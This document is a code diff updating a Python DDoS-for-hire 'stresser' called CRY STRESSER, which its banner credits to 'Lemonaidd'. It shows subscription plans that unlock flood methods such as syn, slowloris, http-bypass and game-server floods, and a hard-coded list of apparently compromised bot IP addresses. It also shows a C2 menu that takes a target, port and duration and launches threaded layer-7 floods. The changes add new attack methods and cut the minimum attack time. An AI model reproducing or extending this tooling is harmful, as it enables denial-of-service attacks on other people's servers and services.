@@ -91,13 +91,13 @@ f1ff72b3f04a389ab96d9a508d5c2cfb = {
 
 PLANS = {
     "free":  {"methods": ["tcp","syn","curl","tcphex","http","synhex"], "maxtime": 120, "maxattacks": 5, "maxconcurrents": 1, "total_bandwidth_mb": 100},
-    "hard":  {"methods": ["tcp","tcphex","slowloris","curl","syn","home","hexgen","https","synhex"], "maxtime": 500, "maxattacks": 10, "maxconcurrents": 20, "total_bandwidth_mb": 500},
-    "pro":   {"methods": ["tcp","udp","http","https","curl","slowloris","nethold","minecraft","hexgen","tcphex","synhex"], "maxtime": 1000, "maxattacks": 50, "maxconcurrents": 50, "total_bandwidth_mb": 1000},
-    "vip":   {"methods": ["tcp","tcpbypass","udpbypass","curl","slowloris","nethold","home","fivem","minecraft","hexgen","tcphex","tlsvip","https","synhex"], "maxtime": 3600, "maxattacks": 100, "maxconcurrents": 299, "total_bandwidth_mb": 10000},
+    "hard":  {"methods": ["tcp","tcphex","slowloris","curl","syn","home","hexgen","https","synhex","proxy"], "maxtime": 500, "maxattacks": 10, "maxconcurrents": 20, "total_bandwidth_mb": 500},
+    "pro":   {"methods": ["tcp","udp","http","https","curl","slowloris","nethold","minecraft","hexgen","proxy","tcphex","synhex"], "maxtime": 1000, "maxattacks": 50, "maxconcurrents": 50, "total_bandwidth_mb": 1000},
+    "vip":   {"methods": ["tcp","tcpbypass","udpbypass","curl","slowloris","nethold","home","fivem","minecraft","hexgen","tcphex","tlsvip","https","synhex","proxy","http"], "maxtime": 3600, "maxattacks": 100, "maxconcurrents": 299, "total_bandwidth_mb": 10000},
     "admin": {"methods": ["*"], "maxtime": 9999, "maxattacks": None, "maxconcurrents": 1000, "total_bandwidth_mb": None}
 }
 
-ALL_METHODS = ["tcp","udp","http","https","curl","syn","slowloris","nethold","home","sslslam","tlsvip","fivem","minecraft","hexgen","udphex","tcphex","synhex"]
+ALL_METHODS = ["tcp","udp","http","https","curl","syn","slowloris","nethold","home","sslslam","tlsvip","fivem","minecraft","hexgen","udphex","tcphex","synhex","proxy","http-bypass","net-bypass","kahoot"]
 
 bot_ipv4_list = [
     "24.5.119.233", "99.232.138.45", "184.66.78.145", "68.149.122.180", "70.55.54.221",
@@ -201,7 +201,7 @@ def banner():
 ██║     ██████╔╝ ╚████╔╝ 
 ██║     ██╔══██╗  ╚██╔╝  
 ╚██████╗██║  ██║   ██║   
- ╚═════╝╚═╝  ╚═╝   ╚═╝   v1.7
+ ╚═════╝╚═╝  ╚═╝   ╚═╝   v1.8
         CRY STRESSER • 2026
       Made by Lemonaidd
 
@@ -347,6 +347,7 @@ def hex_attack_thread(ip, port, duration, method, mode=2):
                 if mode == 2:
                     print(f"{C}[HEXGEN] {ip}:{port} HEXID:{hex_id}{RST}")
 
+
         except:
             pass
 
@@ -402,7 +403,7 @@ def launch(ip, port, duration, method, mode=2, concurrents=None):
     est_mb = used_concurrents * 0.5 * duration
     total_allowed = PLANS[current_plan]["total_bandwidth_mb"]
     if total_allowed is not None and (bandwidth_used_mb + est_mb) > total_allowed:
-        print(f"{R}[C2] Bandwidth limit exceeded!{RST}")
+        print(f"{R}[C2] Bandwidth limit exceeded! cannot perform anymore attacks. Try again later or Upgrade your plan.{RST}")
         return
 
     bandwidth_used_mb += est_mb
@@ -435,11 +436,11 @@ def launch(ip, port, duration, method, mode=2, concurrents=None):
     print(f"{B}║ Method       : {C}{method.upper():<35} {B}║{RST}")
     print(f"{B}║ Concurrents  : {C}{used_concurrents:<35} {B}║{RST}")
     print(f"{B}║ Time Started : {C}{current_time:<35} {B}║{RST}")
-    print(f"{B}║ Duration     : {C}{duration}s{' '*30} {B}║{RST}")
+    print(f"{B}║ Duration     : {C}{duration}s{' '*30} {B}  ║{RST}")
     print(f"{B}║ Attack ID    : {C}{attack_id:<35} {B}║{RST}")
-    print(f"{B}╚══════════════════════════════════════════════════╝{RST}\n")
+    print(f"{B}╚═════════════════════════════════════════════════════╝{RST}\n")
 
-    if method in ["http","https","synhex","syn"]:
+    if method in ["http","https","synhex","proxy"]:
         for _ in range(used_concurrents):
             threading.Thread(target=l7_curl, args=(f"http://{ip}:{port}", duration), daemon=True).start()
             
@@ -624,7 +625,7 @@ while True:
             try:
                 target = input(f"{B}Target: {RST}")
                 port = int(input(f"{B}Port: {RST}"))
-                duration = max(60, int(input(f"{B}Time (min 60s): {RST}")))
+                duration = max(10, int(input(f"{B}Time (min 10s): {RST}")))
                 method = input(f"{B}Method: {RST}").lower()
                 print(f"{B}1 = Silent | 2 = Flood Logs{RST}")
                 mode = input(f"{B}Mode: {RST}") or "2"
@@ -643,13 +644,13 @@ while True:
         elif cmd == "!l7":
             try:
                 url = input(f"{B}URL: {RST}")
-                duration = max(60, int(input(f"{B}Time (min 60s): {RST}")))
+                duration = max(10, int(input(f"{B}Time (min 10s): {RST}")))
                 if duration > PLANS[current_plan]["maxtime"]:
                     print(f"{R}[C2] Max time exceeded{RST}")
                     continue
                 host = url.split("//")[-1].split("/")[0]
                 port = 443 if url.startswith("https") else 80
-                method = input(f"{B}L7 Method (curl/slowloris/nethold): {RST}").lower() or "curl"
+                method = input(f"{B}L7 Method (curl/http/nethold): {RST}").lower() or "curl"
                 if method in ["slowloris","nethold"] and current_plan not in ["pro","vip","admin"]:
                     print(f"{R}[C2] slowloris/nethold = pro+ only{RST}")
                     continue
@@ -671,7 +672,7 @@ while True:
                 method = args[0][1:].lower()
                 target = args[1]
                 port = int(args[2])
-                duration = max(60, int(args[3]))
+                duration = max(10, int(args[3]))
 
                 if method not in PLANS[current_plan]["methods"] and PLANS[current_plan]["methods"] != ["*"]:
                     print(f"{R}[C2] Method locked{RST}")
